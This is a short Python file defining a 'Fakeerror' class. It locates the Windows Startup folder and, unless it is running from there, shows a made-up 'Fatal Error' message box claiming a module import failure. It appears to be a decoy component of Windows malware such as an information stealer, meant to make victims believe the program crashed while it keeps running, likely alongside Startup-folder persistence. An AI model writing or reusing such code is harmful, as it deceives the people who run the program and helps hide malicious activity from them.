import ctypes
import os
import sys

class Fakeerror():
    def __init__(self):
        self.startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        self.fakeerror()

    def GetSelf(self) -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.argv[0], True)
        else:
            return (__file__, False)

    def fakeerror(self):
        path, _ = self.GetSelf()
        source_path = os.path.abspath(path)
        if os.path.basename(os.path.dirname(source_path)).lower() == "startup":
            return
        ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)